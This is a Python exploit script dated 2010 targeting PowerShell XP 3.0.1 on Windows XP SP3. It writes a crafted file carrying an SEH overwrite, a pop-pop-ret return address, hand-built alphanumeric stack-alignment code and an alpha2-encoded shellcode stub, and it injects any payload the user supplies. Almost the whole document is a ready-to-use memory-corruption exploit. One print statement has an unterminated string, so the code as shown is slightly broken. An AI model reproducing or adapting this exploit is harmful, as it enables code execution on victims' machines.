#!/usr/bin/python

# vuln finders : kmkz, zadyree, hellpast
# author : m_101
# site   : http://binholic.blogspot.com/
# Exploit Title: PowerShell XP 3.0.1 0day
# Date: 11/12/2010
# Author: m_101
# Software Link: http://www.softpedia.com/progDownload/PowerShell-XP-Download-22529.html
# Version: 3.0.1
# Tested on: Windows XP SP3 English

import sys

if len(sys.argv) < 4:
    print("Usage: %s input output payload" % sys.argv[0])
    print("Payload must be encoded with alpha2 and EAX based
    exit(1)

# get file content
infile = sys.argv[1]
fp = open(infile, 'r')
content = fp.read()
fp.close()

#
fpayload = sys.argv[3]
fp = open(fpayload, 'r')
payload = fp.read()
fp.close()

# first offset ... but not enough room
# ret_offset = 248
ret_offset = 5268

# pop pop ret
ret = "\x9e\x13\x40\x00"

ecx = "\x45\x61\x39\x76"
eax = "\x47\x61\x39\x76"

print("Constructing alignment code")
# alignment code
# dec esp
# dec esp
# dec esp
# dec esp
align = 'L' * 4
# push esp  ; save current esp register
align += 'T'
# pop edx   ; save in edx
align += 'Z'
# pop esp (make esp point to data)
align += '\\'
# push edx  ; old esp register
align += 'R'    # edi
# popad
align += 'a'

# align += ecx
# align += eax

# we get actual value (for later restore ;))
# pop ecx
# push ecx
align += "\x59\x51"
# push esp
# pop eax       ; here the code is adjusted but we still need to restore old stack
align += 'TX'
# we repatch the stack (or we may have bad memory access ;))
# push ecx
align += "\x51"
# we don't want our current instructions to be crushed
# dec esp * 4
align += 'L' * 8
# push edi  ; old stack
align += 'W'
# pop esp   ; restore old stack
align += '\\'
# junk bytes
align += 'K' * 4 # scrape space (esp point here)

# buffer need to be long enough ;)
print("Padding")

print("Constructing payload")
msg = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIhkS62xKYc5wpC0uP9xZUKOkOyonahlwP5PEPuPK9kUOySuc8kXf6Gp5Ps0Phnn0NdNzLPPm81yS05Ps0NiQUuPLKsmEXmQO38WePEP5PPSYoPUuPsXMxOR2mMlPPKXrnePgpwpOyG5Vd0h5P7p5PuPLKCm38mQksJB5PC05PpSLKSmS8NaiSJMgpgpwpQCSXwpuPS0GpKOpUTDlKBedHmks9uRWp5PvazxioKP01O0PdUS3ptp1hvlLKQPTLnkRPglnMNkcpS8XkUYNk1PttnmCpsLnksp7LySQpnkbLddQ4lKPE5lLKrtuUrX5Q8jLK3zTXNkQJ5peQXkysvWSyNkP4LKuQXnTq9otqyPKLNLMTKp444JyQXOTMWqKwyyIaKOKOKOwKcL145x45YNLK3jTdeQ8kCVNkflbkNk0ZULs18klKuTLKgqKXLIW4VDglE1hBUXWpt5cC1uBRUcGBfN2DPl0lWpaXpa2C2K3UpdTaup7JUyuPPPu1RWPnQuPdupsRaiUpBMcotqtpvQWpA"
payload = msg + payload
print("Payload size : %u" % len(payload))
# let's have the minimum correct buffer length!
padding = (ret_offset - len(payload) - len(align)) * 'C'

print("Constructing egg")
egg = align + payload + padding + ret
print("Egg size : %u" % len(egg))

modified = content.replace('TESTTEST', egg)

# working
outfile = sys.argv[2]
print ("Writing exploit file : %s" % outfile)
fp = open(outfile, 'w')
fp.write(modified)
fp.close()